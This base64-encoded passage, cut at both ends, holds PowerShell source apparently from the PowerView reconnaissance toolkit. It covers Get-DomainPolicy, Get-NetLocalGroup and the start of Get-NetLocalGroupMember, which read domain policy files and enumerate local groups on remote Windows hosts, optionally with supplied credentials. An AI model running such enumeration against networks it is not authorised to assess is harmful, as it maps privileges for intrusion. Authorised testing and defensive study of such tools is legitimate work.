ZXQtRG9tYWluUG9saWN5IC1DcmVkZW50aWFsICRDcmVkCgouT1VUUFVUUwoKSGFzaHRhYmxlCgpPdXB1dHMgYSBoYXNodGFibGUgcmVwcmVzZW50aW5nIHRoZSBwYXJzZWQgR3B0VG1wbC5pbmYgZmlsZS4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoW0hhc2h0YWJsZV0pXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnTmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0RvbWFpbicsICdEQycsICdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU291cmNlID0gJ0RvbWFpbicsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRSZXNvbHZlU2lkcywKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICAkQ29udmVydEFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRDb252ZXJ0QXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQ29udmVydEFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7CiAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluCiAgICAgICAgICAgICRDb252ZXJ0QXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4KICAgICAgICB9CgogICAgICAgIGlmICgkU291cmNlIC1lcSAnRG9tYWluJykgewogICAgICAgICAgICAjIHF1ZXJ5IHRoZSBnaXZlbiBkb21haW4gZm9yIHRoZSBkZWZhdWx0IGRvbWFpbiBwb2xpY3kgb2JqZWN0IChuYW1lID0gezMxQjJGMzQwLTAxNkQtMTFEMi05NDVGLTAwQzA0RkI5ODRGOX0pCiAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICd7MzFCMkYzNDAtMDE2RC0xMUQyLTk0NUYtMDBDMDRGQjk4NEY5fScKICAgICAgICAgICAgJEdQTyA9IEdldC1Eb21haW5HUE8gQFNlYXJjaGVyQXJndW1lbnRzCgogICAgICAgICAgICBpZiAoJEdQTykgewogICAgICAgICAgICAgICAgIyBncmFiIHRoZSBHcHRUbXBsLmluZiBmaWxlIGFuZCBwYXJzZSBpdAogICAgICAgICAgICAgICAgJEdwdFRtcGxQYXRoID0gJEdQTy5ncGNmaWxlc3lzcGF0aCArICdcTUFDSElORVxNaWNyb3NvZnRcV2luZG93cyBOVFxTZWNFZGl0XEdwdFRtcGwuaW5mJwogICAgICAgICAgICAgICAgJFBhcnNlQXJncyA9ICBAeydHcHRUbXBsUGF0aCcgPSAkR3B0VG1wbFBhdGh9CiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFBhcnNlQXJnc1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICAgICAgICAgR2V0LUdwdFRtcGwgQFBhcnNlQXJncwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAjIHF1ZXJ5IHRoZSBnaXZlbiBkb21haW4vZGMgZm9yIHRoZSBkZWZhdWx0IGRvbWFpbiBjb250cm9sbGVyIHBvbGljeSBvYmplY3QgKG5hbWUgPSB7NkFDMTc4NkMtMDE2Ri0xMUQyLTk0NUYtMDBDMDRGQjk4NEY5fSkKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJ3s2QUMxNzg2Qy0wMTZGLTExRDItOTQ1Ri0wMEMwNEZCOTg0Rjl9JwogICAgICAgICAgICAkR1BPID0gR2V0LURvbWFpbkdQTyBAU2VhcmNoZXJBcmd1bWVudHMKCiAgICAgICAgICAgIGlmICgkR1BPKSB7CiAgICAgICAgICAgICAgICAjIGdyYWIgdGhlIEdwdFRtcGwuaW5mIGZpbGUgYW5kIHBhcnNlIGl0CiAgICAgICAgICAgICAgICAkR3B0VG1wbFBhdGggPSAkR1BPLmdwY2ZpbGVzeXNwYXRoICsgIlxNQUNISU5FXE1pY3Jvc29mdFxXaW5kb3dzIE5UXFNlY0VkaXRcR3B0VG1wbC5pbmYiCgogICAgICAgICAgICAgICAgJFBhcnNlQXJncyA9ICBAeydHcHRUbXBsUGF0aCcgPSAkR3B0VG1wbFBhdGh9CiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFBhcnNlQXJnc1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICAgICAgICAgICMgcGFyc2UgdGhlIEdwdFRtcGwuaW5mCiAgICAgICAgICAgICAgICBHZXQtR3B0VG1wbCBAUGFyc2VBcmdzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc29sdmVTaWRzJ10pIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFJvb3QgPSAkXwogICAgICAgICAgICAgICAgICAgICAgICAkUHJpdmlsZWdlUmlnaHRzUmVzb3ZsZWQgPSBAe30KICAgICAgICAgICAgICAgICAgICAgICAgIyBpZiB3ZSdyZSByZXNvbHZpbmcgc2lkcyBpbiBQcml2aWxlZ2VSaWdodHMgdG8gbmFtZXMKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRSb290LidQcml2aWxlZ2UgUmlnaHRzJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFByaXZpbGVnZVJpZ2h0cyA9ICRSb290LidQcml2aWxlZ2UgUmlnaHRzJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgRm9yRWFjaCAoJFByaXZpbGVnZVJpZ2h0IGluICRQcml2aWxlZ2VSaWdodHMuS2V5cykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRQcml2aWxlZ2VSaWdodHNSZXNvdmxlZFskUHJpdmlsZWdlUmlnaHRdID0gJFByaXZpbGVnZVJpZ2h0cy4iJFByaXZpbGVnZVJpZ2h0IiB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfIHwgRm9yRWFjaC1PYmplY3QgeyBDb252ZXJ0RnJvbS1TSUQgLU9iamVjdFNpZCAoJF8uVHJpbSgnKicpKSBAQ29udmVydEFyZ3VtZW50cyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Qb2xpY3ldIEVycm9yIHJlc29sdmluZyBTSUQgOiAkXyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJFJvb3QuJ1ByaXZpbGVnZSBSaWdodHMnID0gJFByaXZpbGVnZVJpZ2h0c1Jlc292bGVkCiAgICAgICAgICAgICAgICAgICAgICAgICRSb290CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgeyAkXyB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojCiMgRnVuY3Rpb25zIHRoYXQgZW51bWVyYXRlIGEgc2luZ2xlIGhvc3QsIGVpdGhlciB0aHJvdWdoCiMgV2luTlQsIFdNSSwgcmVtb3RlIHJlZ2lzdHJ5LCBvciBBUEkgY2FsbHMKIyAod2l0aCBQU1JlZmxlY3QpLgojCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgpmdW5jdGlvbiBHZXQtTmV0TG9jYWxHcm91cCB7CjwjCi5TWU5PUFNJUwoKRW51bWVyYXRlcyB0aGUgbG9jYWwgZ3JvdXBzIG9uIHRoZSBsb2NhbCAob3IgcmVtb3RlKSBtYWNoaW5lLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBQU1JlZmxlY3QgIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIHdpbGwgZW51bWVyYXRlIHRoZSBuYW1lcyBhbmQgZGVzY3JpcHRpb25zIGZvciB0aGUKbG9jYWwgZ3JvdXBzIG9uIHRoZSBjdXJyZW50LCBvciByZW1vdGUsIG1hY2hpbmUuIEJ5IGRlZmF1bHQsIHRoZSBXaW4zMiBBUEkKY2FsbCBOZXRMb2NhbEdyb3VwRW51bSB3aWxsIGJlIHVzZWQgKGZvciBzcGVlZCkuIFNwZWNpZnlpbmcgIi1NZXRob2QgV2luTlQiCmNhdXNlcyB0aGUgV2luTlQgc2VydmljZSBwcm92aWRlciB0byBiZSB1c2VkIGluc3RlYWQsIHdoaWNoIHJldHVybnMgZ3JvdXAKU0lEcyBhbG9uZyB3aXRoIHRoZSBncm91cCBuYW1lcyBhbmQgZGVzY3JpcHRpb25zL2NvbW1lbnRzLgoKLlBBUkFNRVRFUiBDb21wdXRlck5hbWUKClNwZWNpZmllcyB0aGUgaG9zdG5hbWUgdG8gcXVlcnkgZm9yIHNlc3Npb25zIChhbHNvIGFjY2VwdHMgSVAgYWRkcmVzc2VzKS4KRGVmYXVsdHMgdG8gdGhlIGxvY2FsaG9zdC4KCi5QQVJBTUVURVIgTWV0aG9kCgpUaGUgY29sbGVjdGlvbiBtZXRob2QgdG8gdXNlLCBkZWZhdWx0cyB0byAnQVBJJywgYWxzbyBhY2NlcHRzICdXaW5OVCcuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gYSByZW1vdGUgbWFjaGluZS4gT25seSBhcHBsaWNhYmxlIHdpdGggIi1NZXRob2QgV2luTlQiLgoKLkVYQU1QTEUKCkdldC1OZXRMb2NhbEdyb3VwCgpDb21wdXRlck5hbWUgICAgICAgICAgICAgICAgICBHcm91cE5hbWUgICAgICAgICAgICAgICAgICAgICBDb21tZW50Ci0tLS0tLS0tLS0tLSAgICAgICAgICAgICAgICAgIC0tLS0tLS0tLSAgICAgICAgICAgICAgICAgICAgIC0tLS0tLS0KV0lORE9XUzEgICAgICAgICAgICAgICAgICAgICAgQWRtaW5pc3RyYXRvcnMgICAgICAgICAgICAgICAgQWRtaW5pc3RyYXRvcnMgaGF2ZSBjb21wbGUuLi4KV0lORE9XUzEgICAgICAgICAgICAgICAgICAgICAgQmFja3VwIE9wZXJhdG9ycyAgICAgICAgICAgICAgQmFja3VwIE9wZXJhdG9ycyBjYW4gb3ZlcnIuLi4KV0lORE9XUzEgICAgICAgICAgICAgICAgICAgICAgQ3J5cHRvZ3JhcGhpYyBPcGVyYXRvcnMgICAgICAgTWVtYmVycyBhcmUgYXV0aG9yaXplZCB0byAuLi4KLi4uCgouRVhBTVBMRQoKR2V0LU5ldExvY2FsR3JvdXAgLU1ldGhvZCBXaW5udAoKQ29tcHV0ZXJOYW1lICAgICAgICAgICBHcm91cE5hbWUgICAgICAgICAgICAgIEdyb3VwU0lEICAgICAgICAgICAgICBDb21tZW50Ci0tLS0tLS0tLS0tLSAgICAgICAgICAgLS0tLS0tLS0tICAgICAgICAgICAgICAtLS0tLS0tLSAgICAgICAgICAgICAgLS0tLS0tLQpXSU5ET1dTMSAgICAgICAgICAgICAgIEFkbWluaXN0cmF0b3JzICAgICAgICAgUy0xLTUtMzItNTQ0ICAgICAgICAgIEFkbWluaXN0cmF0b3JzIGhhdi4uLgpXSU5ET1dTMSAgICAgICAgICAgICAgIEJhY2t1cCBPcGVyYXRvcnMgICAgICAgUy0xLTUtMzItNTUxICAgICAgICAgIEJhY2t1cCBPcGVyYXRvcnMgYy4uLgpXSU5ET1dTMSAgICAgICAgICAgICAgIENyeXB0b2dyYXBoaWMgT3BlcmEuLi4gUy0xLTUtMzItNTY5ICAgICAgICAgIE1lbWJlcnMgYXJlIGF1dGhvci4uLgouLi4KCi5FWEFNUExFCgpHZXQtTmV0TG9jYWxHcm91cCAtQ29tcHV0ZXJOYW1lIHByaW1hcnkudGVzdGxhYi5sb2NhbAoKQ29tcHV0ZXJOYW1lICAgICAgICAgICAgICAgICAgR3JvdXBOYW1lICAgICAgICAgICAgICAgICAgICAgQ29tbWVudAotLS0tLS0tLS0tLS0gICAgICAgICAgICAgICAgICAtLS0tLS0tLS0gICAgICAgICAgICAgICAgICAgICAtLS0tLS0tCnByaW1hcnkudGVzdGxhYi5sb2NhbCAgICAgICAgIEFkbWluaXN0cmF0b3JzICAgICAgICAgICAgICAgIEFkbWluaXN0cmF0b3JzIGhhdmUgY29tcGxlLi4uCnByaW1hcnkudGVzdGxhYi5sb2NhbCAgICAgICAgIFVzZXJzICAgICAgICAgICAgICAgICAgICAgICAgIFVzZXJzIGFyZSBwcmV2ZW50ZWQgZnJvbSBtLi4uCnByaW1hcnkudGVzdGxhYi5sb2NhbCAgICAgICAgIEd1ZXN0cyAgICAgICAgICAgICAgICAgICAgICAgIEd1ZXN0cyBoYXZlIHRoZSBzYW1lIGFjY2VzLi4uCnByaW1hcnkudGVzdGxhYi5sb2NhbCAgICAgICAgIFByaW50IE9wZXJhdG9ycyAgICAgICAgICAgICAgIE1lbWJlcnMgY2FuIGFkbWluaXN0ZXIgZG9tLi4uCnByaW1hcnkudGVzdGxhYi5sb2NhbCAgICAgICAgIEJhY2t1cCBPcGVyYXRvcnMgICAgICAgICAgICAgIEJhY2t1cCBPcGVyYXRvcnMgY2FuIG92ZXJyLi4uCgouT1VUUFVUUwoKUG93ZXJWaWV3LkxvY2FsR3JvdXAuQVBJCgpDdXN0b20gUFNPYmplY3Qgd2l0aCB0cmFuc2xhdGVkIGdyb3VwIHByb3BlcnR5IGZpZWxkcyBmcm9tIEFQSSByZXN1bHRzLgoKUG93ZXJWaWV3LkxvY2FsR3JvdXAuV2luTlQKCkN1c3RvbSBQU09iamVjdCB3aXRoIHRyYW5zbGF0ZWQgZ3JvdXAgcHJvcGVydHkgZmllbGRzIGZyb20gV2luTlQgcmVzdWx0cy4KCi5MSU5LCgpodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3dpbmRvd3MvZGVza3RvcC9hYTM3MDQ0MCh2PXZzLjg1KS5hc3B4CiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuTG9jYWxHcm91cC5BUEknKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuTG9jYWxHcm91cC5XaW5OVCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAkRW52OkNPTVBVVEVSTkFNRSwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdBUEknLCAnV2luTlQnKV0KICAgICAgICBbQWxpYXMoJ0NvbGxlY3Rpb25NZXRob2QnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRNZXRob2QgPSAnQVBJJywKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSAtYW5kICgkTWV0aG9kIC1lcSAnV2luTlQnKSkgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LU5ldExvY2FsR3JvdXBdIC1DcmVkZW50aWFsIGlzIG9ubHkgY29tcGF0aWJsZSB3aXRoICctTWV0aG9kIFdpbk5UJyIKICAgICAgICB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgRm9yRWFjaCAoJENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgaWYgKCRNZXRob2QgLWVxICdBUEknKSB7CiAgICAgICAgICAgICAgICAjIGlmIHdlJ3JlIHVzaW5nIHRoZSBOZXRhcGkzMiBOZXRMb2NhbEdyb3VwRW51bSBBUEkgY2FsbCB0byBnZXQgdGhlIGxvY2FsIGdyb3VwIGluZm9ybWF0aW9uCgogICAgICAgICAgICAgICAgIyBhcmd1bWVudHMgZm9yIE5ldExvY2FsR3JvdXBFbnVtCiAgICAgICAgICAgICAgICAkUXVlcnlMZXZlbCA9IDEKICAgICAgICAgICAgICAgICRQdHJJbmZvID0gW0ludFB0cl06Olplcm8KICAgICAgICAgICAgICAgICRFbnRyaWVzUmVhZCA9IDAKICAgICAgICAgICAgICAgICRUb3RhbFJlYWQgPSAwCiAgICAgICAgICAgICAgICAkUmVzdW1lSGFuZGxlID0gMAoKICAgICAgICAgICAgICAgICMgZ2V0IHRoZSBsb2NhbCB1c2VyIGluZm9ybWF0aW9uCiAgICAgICAgICAgICAgICAkUmVzdWx0ID0gJE5ldGFwaTMyOjpOZXRMb2NhbEdyb3VwRW51bSgkQ29tcHV0ZXIsICRRdWVyeUxldmVsLCBbcmVmXSRQdHJJbmZvLCAtMSwgW3JlZl0kRW50cmllc1JlYWQsIFtyZWZdJFRvdGFsUmVhZCwgW3JlZl0kUmVzdW1lSGFuZGxlKQoKICAgICAgICAgICAgICAgICMgbG9jYXRlIHRoZSBvZmZzZXQgb2YgdGhlIGluaXRpYWwgaW50UHRyCiAgICAgICAgICAgICAgICAkT2Zmc2V0ID0gJFB0ckluZm8uVG9JbnQ2NCgpCgogICAgICAgICAgICAgICAgIyAwID0gc3VjY2VzcwogICAgICAgICAgICAgICAgaWYgKCgkUmVzdWx0IC1lcSAwKSAtYW5kICgkT2Zmc2V0IC1ndCAwKSkgewoKICAgICAgICAgICAgICAgICAgICAjIFdvcmsgb3V0IGhvdyBtdWNoIHRvIGluY3JlbWVudCB0aGUgcG9pbnRlciBieSBmaW5kaW5nIG91dCB0aGUgc2l6ZSBvZiB0aGUgc3RydWN0dXJlCiAgICAgICAgICAgICAgICAgICAgJEluY3JlbWVudCA9ICRMT0NBTEdST1VQX0lORk9fMTo6R2V0U2l6ZSgpCgogICAgICAgICAgICAgICAgICAgICMgcGFyc2UgYWxsIHRoZSByZXN1bHQgc3RydWN0dXJlcwogICAgICAgICAgICAgICAgICAgIGZvciAoJGkgPSAwOyAoJGkgLWx0ICRFbnRyaWVzUmVhZCk7ICRpKyspIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyBjcmVhdGUgYSBuZXcgaW50IHB0ciBhdCB0aGUgZ2l2ZW4gb2Zmc2V0IGFuZCBjYXN0IHRoZSBwb2ludGVyIGFzIG91ciByZXN1bHQgc3RydWN0dXJlCiAgICAgICAgICAgICAgICAgICAgICAgICROZXdJbnRQdHIgPSBOZXctT2JqZWN0IFN5c3RlbS5JbnRwdHIgLUFyZ3VtZW50TGlzdCAkT2Zmc2V0CiAgICAgICAgICAgICAgICAgICAgICAgICRJbmZvID0gJE5ld0ludFB0ciAtYXMgJExPQ0FMR1JPVVBfSU5GT18xCgogICAgICAgICAgICAgICAgICAgICAgICAkT2Zmc2V0ID0gJE5ld0ludFB0ci5Ub0ludDY0KCkKICAgICAgICAgICAgICAgICAgICAgICAgJE9mZnNldCArPSAkSW5jcmVtZW50CgogICAgICAgICAgICAgICAgICAgICAgICAkTG9jYWxHcm91cCA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgJExvY2FsR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgJExvY2FsR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBOYW1lJyAkSW5mby5sZ3JwaTFfbmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkTG9jYWxHcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21tZW50JyAkSW5mby5sZ3JwaTFfY29tbWVudAogICAgICAgICAgICAgICAgICAgICAgICAkTG9jYWxHcm91cC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuTG9jYWxHcm91cC5BUEknKQogICAgICAgICAgICAgICAgICAgICAgICAkTG9jYWxHcm91cAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAjIGZyZWUgdXAgdGhlIHJlc3VsdCBidWZmZXIKICAgICAgICAgICAgICAgICAgICAkTnVsbCA9ICROZXRhcGkzMjo6TmV0QXBpQnVmZmVyRnJlZSgkUHRySW5mbykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtTmV0TG9jYWxHcm91cF0gRXJyb3I6ICQoKFtDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbl0gJFJlc3VsdCkuTWVzc2FnZSkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAjIG90aGVyd2lzZSB3ZSdyZSB1c2luZyB0aGUgV2luTlQgc2VydmljZSBwcm92aWRlcgogICAgICAgICAgICAgICAgaWYgKCRDcmVkZW50aWFsIC1uZSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5KSB7CiAgICAgICAgICAgICAgICAgICAgJENvbXB1dGVyUHJvdmlkZXIgPSBOZXctT2JqZWN0IERpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5KCJXaW5OVDovLyRDb21wdXRlcixjb21wdXRlciIsICRDcmVkZW50aWFsLlVzZXJOYW1lLCAkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLlBhc3N3b3JkKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJENvbXB1dGVyUHJvdmlkZXIgPSBbQURTSV0iV2luTlQ6Ly8kQ29tcHV0ZXIsY29tcHV0ZXIiCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJENvbXB1dGVyUHJvdmlkZXIucHNiYXNlLmNoaWxkcmVuIHwgV2hlcmUtT2JqZWN0IHsgJF8ucHNiYXNlLnNjaGVtYUNsYXNzTmFtZSAtZXEgJ2dyb3VwJyB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICRMb2NhbEdyb3VwID0gKFtBRFNJXSRfKQogICAgICAgICAgICAgICAgICAgICRHcm91cCA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBOYW1lJyAoJExvY2FsR3JvdXAuSW52b2tlR2V0KCdOYW1lJykpCiAgICAgICAgICAgICAgICAgICAgJEdyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1NJRCcgKChOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyKCRMb2NhbEdyb3VwLkludm9rZUdldCgnb2JqZWN0c2lkJyksMCkpLlZhbHVlKQogICAgICAgICAgICAgICAgICAgICRHcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21tZW50JyAoJExvY2FsR3JvdXAuSW52b2tlR2V0KCdEZXNjcmlwdGlvbicpKQogICAgICAgICAgICAgICAgICAgICRHcm91cC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuTG9jYWxHcm91cC5XaW5OVCcpCiAgICAgICAgICAgICAgICAgICAgJEdyb3VwCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtTmV0TG9jYWxHcm91cE1lbWJlciB7CjwjCi5TWU5PUFNJUwoKRW51bWVyYXRlcyBtZW1iZXJzIG9mIGEgc3BlY2lmaWMgbG9jYWwgZ3JvdXAgb24gdGhlIGxvY2FsIChvciByZW1vdGUpIG1hY2hpbmUuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IFBTUmVmbGVjdCwgQ29udmVydC1BRE5hbWUgIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIHdpbGwgZW51bWVyYXRlIHRoZSBtZW1iZXJzIG9mIGEgc3BlY2lmaWVkIGxvY2FsIGdyb3VwICBvbiB0aGUKY3VycmVudCwgb3IgcmVtb3RlLCBtYWNoaW5lLiBCeSBkZWZhd